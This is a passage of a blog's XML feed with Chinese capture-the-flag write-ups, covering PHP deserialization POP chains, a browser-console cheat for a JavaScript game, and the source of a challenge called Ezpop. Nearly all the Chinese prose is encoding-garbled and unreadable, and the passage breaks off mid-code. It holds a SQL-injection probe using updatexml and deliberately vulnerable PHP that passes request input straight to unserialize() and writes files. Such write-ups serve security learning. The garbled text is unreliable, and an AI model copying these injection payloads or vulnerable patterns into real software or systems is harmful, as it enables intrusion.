        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>å¥½å‡ å¤©æ²¡æœ‰æ›´åšäº†ï¼Œè¿™æ˜ŸæœŸä¸€å®šè¦å®Œæˆä»»åŠ¡.<br><br>åœ¨æƒ³å¦‚æœæˆ‘ä¸€æ˜ŸæœŸèƒ½ä¿è¯å®¡å¾ˆé•¿çš„ä»£ç ï¼Œåº”è¯¥ä¼šå¯¹æˆ‘çš„ä»£ç å®¡è®¡èƒ½åŠ›æœ‰å¸®åŠ©å§</p><span id="more"></span><p><img src="1.PNG"></p><p>å°è¯•ä¸‡èƒ½å¯†ç ï¼Œæ˜¾ç¤ºçš„æ˜¯Damn you, hacker!ï¼Œè¿›è¡Œfuzzæ¨¡ç³Šæµ‹è¯•</p><p><img src="2.PNG"></p><p>æ˜¾ç¤ºè¿™äº›è¢«è¿‡æ»¤äº†</p><p>â€˜ or updatexml(1,concat(â€˜`â€™,database()),1) â€“+</p><p>emmm,ä¸æ˜¯sqlæ³¨å…¥ï¼Œå¯†ç çˆ†ç ´</p><p>ç™»å½•admin,admin,æ˜¾ç¤ºå¯†ç é”™è¯¯ï¼Œæ‰€ä»¥adminæ˜¯å­˜åœ¨çš„ç”¨æˆ·ï¼Œçˆ†ç ´å¯†ç </p><p>æŠ¥ä¸å‡ºæ¥ã€‚ã€‚ã€‚ã€‚å®åœ¨æ²¡è¾™äº†çœ‹äº†ä¸€çœ¼WPï¼Œå¥½å®¶ä¼™ç«Ÿç„¶æ˜¯<a href="http://www.zip/">www.zip</a>â€¦â€¦.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">update.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#39;lib.php&#39;);</span><br><span class="line">echo &#39;&lt;html&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;update&lt;&#x2F;title&gt;</span><br><span class="line">&lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæœªå®Œæˆçš„é¡µé¢ï¼Œä¸Šçº¿æ—¶å»ºè®®åˆ é™¤æœ¬é¡µé¢&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;html&gt;&#39;;</span><br><span class="line">if ($_SESSION[&#39;login&#39;]!&#x3D;1)&#123;</span><br><span class="line">echo &quot;ä½ è¿˜æ²¡æœ‰ç™»é™†å‘¢ï¼&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$users&#x3D;new User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line">if($_SESSION[&#39;login&#39;]&#x3D;&#x3D;&#x3D;1)&#123;</span><br><span class="line">require_once(&quot;flag.php&quot;);</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>update.phpé‚£é‡Œåªæ˜¯è¾“å‡ºä½ æ²¡ç™»å½•ï¼Œæ¥ä¸‹æ¥çš„ä»£ç è¿˜ä¼šæ‰§è¡Œã€‚update()æ–¹æ³•ä¸­ä¼šè¿›è¡Œååºåˆ—åŒ–ã€‚</p><p><img src="8.PNG"></p><p>ç®€å•çš„ç†ä¸€ä¸‹POCçš„æ€è·¯ã€‚æœ¬ä»¥ä¸ºæ˜¯åˆ©ç”¨Userç±»çš„__constructæ–¹æ³•æ¥è¯»flag.phpï¼Œä½†æ˜¯å‘ç°safe()è¿‡æ»¤äº†flagå’Œ\ï¼Œå› æ­¤ä¼šè¢«è¿‡æ»¤ï¼Œæ— æ³•è¯»å–ã€‚</p><p>ä½†æ˜¯UpdateHelperç±»ä¸­ä¹Ÿæœ‰ä¸€ä¸ª__destruct()æ–¹æ³•ï¼Œä¼šechoã€‚</p><p><img src="9.PNG"></p><p>æ­£å¥½Userç±»å­˜åœ¨__toString()æ–¹æ³•ï¼š</p><p><img src="10.PNG"></p><p>å†åˆ©ç”¨$this-&gt;nickname-&gt;update()å»è§¦å‘Infoç±»çš„__call()ï¼š</p><p><img src="11.PNG"></p><p>è¿™æ ·å°±å¯ä»¥è°ƒç”¨ä¸€ä¸ªloginæ–¹æ³•ã€‚ä½†æ˜¯æ€ä¹ˆå¾—flagï¼Ÿ<br>lib.phpä¸­æœ‰2ä¸ªloginæ–¹æ³•ï¼ŒUserç±»å¾—loginæ–¹æ³•å¯ä»¥è®©$_SESSION[â€˜loginâ€™]=1ï¼Œä½†æ˜¯å¿…é¡»è¿”å›äº†idï¼š</p><p><img src="12.PNG"></p><p>è·Ÿè¿›ä¸€ä¸‹ç¬¬16è¡Œå¾—loginæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹é€»è¾‘ï¼š</p><p><img src="13.PNG"></p><p>æƒ³è¦æ­£å¸¸è¿”å›$idResultï¼Œè¦ä¹ˆ$this-&gt;token==â€™adminâ€™ï¼Œè¦ä¹ˆå°±æ˜¯æŸ¥å¯¹äº†ç”¨æˆ·åå’Œå¯†ç æ‰å¯ä»¥ã€‚</p><p>è¿™æ—¶å€™ä¾¿å¾ˆè‡ªç„¶å¾—å¯ä»¥æƒ³åˆ°æ€è·¯äº†ï¼Œå› ä¸ºååºåˆ—åŒ–å¾—æ—¶å€™é™¤äº†Userç±»ä¸­loginçš„è¿™é‡Œä¸å¯æ§ï¼Œå…¶ä»–åŸºæœ¬éƒ½æ˜¯å¯æ§çš„ã€‚ï¼š</p><p><img src="14.PNG"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦åˆ†2æ¬¡ã€‚ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–æœ€ç»ˆè°ƒç”¨çš„æ˜¯dbCtrlç±»çš„loginï¼Œå› ä¸ºè¿™é‡Œçš„sqlè¯­å¥å’ŒdbCtrléƒ½å¯æ§ï¼Œå› æ­¤å¯ä»¥æˆåŠŸçš„$_SESSION[â€˜tokenâ€™]=$this-&gt;name;ã€‚æ§ä¸€ä¸‹nameï¼Œè®©å®ƒæ˜¯adminã€‚</p><p>#åè®°</p><p>å¦‚æœæ˜¯ä¸€ä¸ªç™»å½•å£ï¼Œsqlæ³¨å…¥ï¼Œçˆ†ç ´éƒ½æ²¡æœ‰æˆåŠŸçš„è¯ï¼Œå¯ä»¥å°è¯•æºç æ³„éœ²ï¼ˆä¸Šæ¬¡çš„HCTFåˆä¸€é“é¢˜ç›®ï¼Œä¹Ÿæ˜¯æºç æ³„éœ²ï¼‰ï¼Œå¹¶ä¸”è¿™é“é¢˜ç›®ä¹Ÿæœ‰æç¤ºè¯´æ˜¯easyphpã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7-ååºåˆ—åŒ–</title>
      <link href="/2021/03/18/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/03/18/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF-EZ-GAME</title>
      <link href="/2021/03/18/VNCTF-EZ-GAME/"/>
      <url>/2021/03/18/VNCTF-EZ-GAME/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>æ‰“å¼€åˆæ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œå’‹éƒ½è¿™ä¹ˆçˆ±å‡ºæ¸¸æˆï¼Œä¸Šæ¬¡HCTFçš„å¤§è¥¿ç“œï¼Œè¿™æ¬¡çš„è¿™ä¸ªåˆæ˜¯ä¸€å¤´é›¾æ°´</p><span id="more"></span><p><a href="https://my.oschina.net/u/4386603/blog/4529738">sojson.v4</a></p><p>è¿™æ˜¯ä¸€ä¸ªå‰ç½®çŸ¥è¯†ï¼Œä¸€ä¸ªæ–°å§¿åŠ¿ï¼Œæˆ‘æ„Ÿè§‰è¿˜æ˜¯æš´åŠ›ç ´è§£çš„æ–¹æ³•æœ€ç›´æ¥ï¼ï¼ï¼</p><p>ä¸»è¦æ˜¯æƒ³è®²ä¸€ä¸‹ï¼Œé‚£ä¸ªjsä¸²æ˜¯æ€ä¹ˆå¾—åˆ°çš„</p><p>å› ä¸ºæ˜¯jsæ··æ·†å˜›ï¼Œè‚¯å®šæ˜¯è¦ä»jsä¸­æ‰¾ï¼Œä¸‹é¢æœ‰ä¸‰ä¸ªjsï¼Œå°±ä¸‰ä¸ªéƒ½æ‰¾ã€‚</p><p>é—®é¢˜æ˜¯ä¸çŸ¥é“æ¯”èµ›çš„æ—¶å€™æœ‰æ²¡æœ‰è¿™ä¸ªhintï¼Œå¦‚æœæ²¡æœ‰é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦‚ä½•åœ¨jsä¸­é‚£ä¹ˆé•¿çš„ä»£ç ä¸­æ‰¾åˆ°è¿™ä¸ª</p><p>äºæ˜¯</p><p>åˆæ˜¯å¦ä¸€ç§æ–¹æ³•</p><p>ä¸Šæ¬¡çš„å¤§è¥¿ç“œéƒ½æ˜¯åœ¨jsä»£ç ä¸­æŸ¥æ‰¾é—®é¢˜ï¼Œææ‡‚jsä»£ç åº”è¯¥æ˜¯å»é€šè¿‡é¢˜ç›®çš„å…³é”®</p><p>å…ˆæ¥çœ‹çœ‹è¿™é“é¢˜ç›®å§ï¼Œè¿™ä¸ªæ¸¸æˆä¸€æ‰“å¼€ç¡®å®æˆ‘ä¸æ‡‚è¿™æ˜¯æ€ä¹ˆç©çš„</p><p>æœ‰ä¸€ä¸ªå°æç¤º</p><pre><code>When life gets you down, it&#39;s never too late to...B O U N C E B A C KA JS13k 2019 GameBy Frank ForceWASD = MoveMouse = AimClick = ThrowSpace = DashHints- You will keep money after you die!- You won&#39;t take damage while dashing.- There are 10 levels.- Sand slows down you and enemies.- Yellow boormang can grab pickups.- Blue boomerang does double damage.- Beat the game to unlock speed run mode.</code></pre><p>å¤§æ¦‚çš„æ„æ€æ˜¯w a s dæ˜¯ç§»åŠ¨ï¼Œç‚¹å‡»é¼ æ ‡é‡Šæ”¾å·¥å…·ï¼Œç©ºæ ¼æ˜¯çŸ­æš‚çš„åŠ é€Ÿ</p><p>æ­»åä½ ä¼šå­˜é’±ï¼  å†²åˆºæ—¶ä¸ä¼šå—åˆ°ä¼¤å®³ã€‚  è¿™æœ‰åå…³  æ²™å­å‡æ…¢äº†ä½ å’Œæ•Œäººçš„é€Ÿåº¦ï¼ˆç©äº†è¿™ä¹ˆé•¿æ—¶é—´ï¼Œæ²¡æœ‰è§åˆ°è¿‡æ²™å­ï¼Œä¸çŸ¥é“åªçš„æ˜¯å•¥ï¼‰é»„è‰²çš„boormangå¯ä»¥æŠ“å–çš®å¡  è“è‰²å›æ—‹é•–é€ æˆåŒå€ä¼¤å®³  å‡»è´¥æ¸¸æˆä»¥è§£é”é€Ÿåº¦è¿è¡Œæ¨¡å¼ã€‚</p><p>é‚£å½“ç„¶å°±æ˜¯é€šå…³æ‹¿åˆ°flagï¼Œæœ€å¼€å§‹æˆ‘ç©äº†ä¸€æ¬¡ï¼Œå°±æ„Ÿè§‰è·ŸHCTFé‚£ä¸ªå¤§è¥¿ç“œä¸€æ ·ï¼Œé è‡ªå·±æ ¹æœ¬å°±è¿‡ä¸äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘å¤ªèœã€‚</p><p>ç„¶åä¸€èˆ¬æ¸¸æˆï¼Œæˆ‘ä»¬éƒ½åº”è¯¥å»æ‰¾å®ƒçš„js</p><p><img src="2.PNG"></p><p>æœ‰ä¸‰ä¸ªjsï¼Œå‰ä¸¤ä¸ªæ˜¯engineï¼Œåº”è¯¥è·Ÿè§£é¢˜æ²¡æœ‰ä»€ä¹ˆå…³ç³»</p><p>å°±çœ‹ä¸€çœ‹gameä¸­é‚£ä¸ªå‡½æ•°æœ‰åŠ©äºæˆ‘ä»¬å¿«é€Ÿé€šå…³ï¼Œå› ä¸ºä»¥å‰æ²¡æœ‰æ¥è§¦è¿‡jsï¼Œæ‰€ä»¥æˆ‘çœ‹è¿™ä¸ªæ„Ÿè§‰å¾ˆéš¾</p><p>å°±é€æ­¥åˆ†æä¸‹</p><p>let è¯­å¥å£°æ˜ä¸€ä¸ªå—çº§ä½œç”¨åŸŸçš„æœ¬åœ°å˜é‡ï¼Œå¹¶ä¸”å¯é€‰çš„å°†å…¶åˆå§‹åŒ–ä¸ºä¸€ä¸ªå€¼</p><pre><code>    let startLevel=0;    let level;    let levelNumber;    let nextLevel;    let warpLevel=0;    let isFinalLevel;    let isStartLevel;    let levelTimer = new Timer();    let endLevelTimer = new Timer();    let levelExit;    let loadNextLevel;    let levelMaze = [];    let levelMazeSize = 4;    let levelColor = new Color();    let levelFrame;    let boss;    let player;    let playerData;    let playerStartPos;    let winTimer = new Timer();    let healthWarning = new Timer();    let buyTimer = new Timer();    let mainCanvas = c1;    let speedRunMode;    let speedRunTime=0;    let speedRunBestTime=0;    let coinSoundTimer = new Timer();</code></pre><p>Â·</p><pre><code>    class PlayerData&#123;// track player data between levels (when player is destroyed)constructor()&#123;    this.health = 3;    this.healthMax = 3;    this.boomerangs = 1;    this.bigBoomerangs = 0;    this.coins = 0;&#125;&#125;</code></pre><p>åœ¨å…³å¡ä¹‹é—´è¿½è¸ªç©å®¶æ•°æ®ï¼ˆç©å®¶è¢«æ¶ˆç­æ—¶ï¼‰ï¼Œæ‰€ä»¥å¦‚æœå½“ç©å®¶æ­»äº†çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªç±»ï¼Œå› ä¸ºé‡Œé¢æœ‰ä¸€ä¸ªç”Ÿå‘½ï¼Œç”Ÿå‘½æœ€å¤§å€¼ï¼Œå›æ—‹é•–ï¼Œå¤§çš„å›æ—‹é•–ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆç†çš„çŒœæµ‹ï¼Œå¦‚æœæˆ‘ä»¬æ”¹å˜äº†è¿™äº›å€¼ï¼Œä¿å­˜åï¼Œå½“æˆ‘ä»¬ç©æ¸¸æˆå¤±è´¥åï¼Œå°±å¯ä»¥åœ¨ä¸‹ä¸€ç›˜åˆ©ç”¨è¿™äº›å€¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function NextLevel()</span><br><span class="line">   &#123;</span><br><span class="line">   &#x2F;&#x2F; go to next level</span><br><span class="line">   levelFrame &#x3D; 0;</span><br><span class="line">   levelNumber &#x3D; nextLevel;</span><br><span class="line">   nextLevel &#x3D; (nextLevel+1)%11;</span><br><span class="line">   </span><br><span class="line">   &#x2F;&#x2F; track highest level reached</span><br><span class="line">   if (!speedRunMode &amp;&amp; levelNumber&gt;warpLevel)</span><br><span class="line">       warpLevel &#x3D; levelNumber;</span><br><span class="line">   localStorage.kbap_warp &#x3D; warpLevel;</span><br><span class="line">   </span><br><span class="line">   &#x2F;&#x2F; check if is special level</span><br><span class="line">   isFinalLevel &#x3D; levelNumber&#x3D;&#x3D;10;</span><br><span class="line">   isStartLevel &#x3D; !levelNumber;</span><br><span class="line">   if (isStartLevel)</span><br><span class="line">       speedRunMode &#x3D; 0; &#x2F;&#x2F; reset speed run on start level</span><br><span class="line">   </span><br><span class="line">   InitLevel();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘è®¤ä¸ºè¿™é“é¢˜æ¯”è¾ƒä»æ…ˆçš„ä¸€ç‚¹æ˜¯å®ƒä¼šåœ¨æ¯ä¸ªå‡½æ•°ï¼ˆä¸ç¡®å®šæ˜¯ä¸æ˜¯å‡½æ•°ï¼‰ï¼ŒåŠ ä¸Šè¿™ä¸ªä¸œè¥¿çš„ä½œç”¨</p><p>å¦‚æœæˆ‘ä»¬ä¸€ç›´åœ¨æ§åˆ¶å°è¾“å…¥NextLevel()ï¼Œé‚£ä¹ˆæˆ‘ä¼šå°±ä¼šè¿›å…¥ä¸‹ä¸€å…³ï¼Œä½†æ˜¯åœ¨ç¬¬åå…³çš„æ—¶å€™æˆ‘ä»¬å¿…éœ€æ‰“è´¥æ€ªç‰©æ‰èƒ½å¾—åˆ°flagï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆå»é€æ­»ä¸€æ¬¡ï¼Œåˆšæ‰çš„ä¿®æ”¹æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¾ˆå¤§çš„å±æ€§å€¼ï¼Œç„¶åå¯ä»¥æ‰“è´¥æ€ªç‰©</p><p>ç„¶åæˆ‘æ„Ÿè§‰ä¸‹é¢æˆ‘ä»¬å¯ä»¥å»æ‰¾ä¸€ä¸‹winTimerï¼Œå› ä¸ºåœ¨leté‡Œé¢æœ‰å“ªä¸ª</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if (isFinalLevel)</span><br><span class="line">          &#123;</span><br><span class="line">              &#x2F;&#x2F; player win</span><br><span class="line">              new Pickup(this.pos, 2);</span><br><span class="line">              SpawnPickups(this.pos,1,40);</span><br><span class="line">              winTimer.Set();</span><br><span class="line">              localStorage.kbap_warp&#x3D;0;</span><br><span class="line">              localStorage.kbap_won&#x3D;1;</span><br><span class="line">              speedRunTime&#x3D;speedRunTime|0;</span><br><span class="line">              if (speedRunMode &amp;&amp; (!speedRunBestTime || speedRunTime &lt; speedRunBestTime))</span><br><span class="line">              &#123;</span><br><span class="line">                  &#x2F;&#x2F; track best speed run time</span><br><span class="line">                  speedRunBestTime &#x3D; speedRunTime;</span><br><span class="line">                  localStorage.kbap_bestTime&#x3D;speedRunBestTime;</span><br><span class="line">              &#125;</span><br><span class="line">              PlaySound(2);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå½“player.winçš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªwinTimer.Set();ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨è¿è¡Œå°è¾“å…¥ï¼Œå°±å¯ä»¥å¾—åˆ°flag</p><p>#åè®°</p><p>æ¸¸æˆçš„é¢˜ç›®ä¸€èˆ¬éƒ½ä¼šè·ŸJSæœ‰å…³ï¼Œå¯ä»¥åœ¨ç©ºé—²çš„æ—¶å€™å¯¹JSæœ‰ä¸ªäº†è§£ï¼Œä¸è‡³äºä¸€ç‚¹éƒ½çœ‹ä¸æ‡‚</p><p>å½“å‡ºç°é¢˜ç›®æ˜¯æ¸¸æˆçš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”è¯¥é¦–å…ˆææ‡‚è¿™ä¸ªæ¸¸æˆæ˜¯æ€ä¹ˆç©çš„ï¼Œç„¶åçœ‹JSé‡Œé¢æœ‰æ²¡æœ‰è·Ÿé€šå…³è¿™ä¸ªæ¸¸æˆæœ‰å…³çš„å‡½æ•°ä»£ç ï¼Œæˆ–åœ¨æ§åˆ¶å°ä¸­è¿è¡Œï¼Œåœ¨æºä»£ç ä¸­ä¿®æ”¹ç„¶åä¿å­˜ï¼Œä¸è¦åˆ·æ–°ç•Œé¢ï¼Œå¦åˆ™ä¼šä¸¢å¤±æ•°æ®</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIS  Ezpop</title>
      <link href="/2021/03/17/Ezpop/"/>
      <url>/2021/03/17/Ezpop/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><p>è¿™é¢˜çš„ä»£ç å¤ªé•¿äº†ï¼ŒåŸºç¡€å¤ªå·®å®åœ¨å®¡ä¸ä¸‹å»</p><span id="more"></span><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line"></span><br><span class="line">   protected $store;</span><br><span class="line"></span><br><span class="line">   protected $key;</span><br><span class="line"></span><br><span class="line">   protected $expire;</span><br><span class="line"></span><br><span class="line">   public function __construct($store, $key &#x3D; &#39;flysystem&#39;, $expire &#x3D; null) &#123;</span><br><span class="line">       $this-&gt;key &#x3D; $key;</span><br><span class="line">       $this-&gt;store &#x3D; $store;</span><br><span class="line">       $this-&gt;expire &#x3D; $expire;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function cleanContents(array $contents) &#123;</span><br><span class="line">       $cachedProperties &#x3D; array_flip([</span><br><span class="line">           &#39;path&#39;, &#39;dirname&#39;, &#39;basename&#39;, &#39;extension&#39;, &#39;filename&#39;,</span><br><span class="line">           &#39;size&#39;, &#39;mimetype&#39;, &#39;visibility&#39;, &#39;timestamp&#39;, &#39;type&#39;,</span><br><span class="line">       ]);</span><br><span class="line"></span><br><span class="line">       foreach ($contents as $path &#x3D;&gt; $object) &#123;</span><br><span class="line">           if (is_array($object)) &#123;</span><br><span class="line">               $contents[$path] &#x3D; array_intersect_key($object, $cachedProperties);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $contents;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function getForStorage() &#123;</span><br><span class="line">       $cleaned &#x3D; $this-&gt;cleanContents($this-&gt;cache);</span><br><span class="line"></span><br><span class="line">       return json_encode([$cleaned, $this-&gt;complete]);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function save() &#123;</span><br><span class="line">       $contents &#x3D; $this-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">       $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function __destruct() &#123;</span><br><span class="line">       if (!$this-&gt;autosave) &#123;</span><br><span class="line">           $this-&gt;save();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line"></span><br><span class="line">   protected function getExpireTime($expire): int &#123;</span><br><span class="line">       return (int) $expire;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function getCacheKey(string $name): string &#123;</span><br><span class="line">       return $this-&gt;options[&#39;prefix&#39;] . $name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   protected function serialize($data): string &#123;</span><br><span class="line">       if (is_numeric($data)) &#123;</span><br><span class="line">           return (string) $data;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $serialize &#x3D; $this-&gt;options[&#39;serialize&#39;];</span><br><span class="line"></span><br><span class="line">       return $serialize($data);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   public function set($name, $value, $expire &#x3D; null): bool&#123;</span><br><span class="line">       $this-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">       if (is_null($expire)) &#123;</span><br><span class="line">           $expire &#x3D; $this-&gt;options[&#39;expire&#39;];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $expire &#x3D; $this-&gt;getExpireTime($expire);</span><br><span class="line">       $filename &#x3D; $this-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">       $dir &#x3D; dirname($filename);</span><br><span class="line"></span><br><span class="line">       if (!is_dir($dir)) &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               mkdir($dir, 0755, true);</span><br><span class="line">           &#125; catch (\Exception $e) &#123;</span><br><span class="line">               &#x2F;&#x2F; åˆ›å»ºå¤±è´¥</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $data &#x3D; $this-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">       if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;æ•°æ®å‹ç¼©</span><br><span class="line">           $data &#x3D; gzcompress($data, 3);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $data &#x3D; &quot;&lt;?php\n&#x2F;&#x2F;&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</span><br><span class="line">       $result &#x3D; file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">       if ($result) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return false;</span><br><span class="line">   &#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;src&#39;])) &#123;</span><br><span class="line">   highlight_file(__FILE__);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">$dir &#x3D; &quot;uploads&#x2F;&quot;;</span><br><span class="line"></span><br><span class="line">if (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">   mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&quot;data&quot;]);</span><br><span class="line"></span><br><span 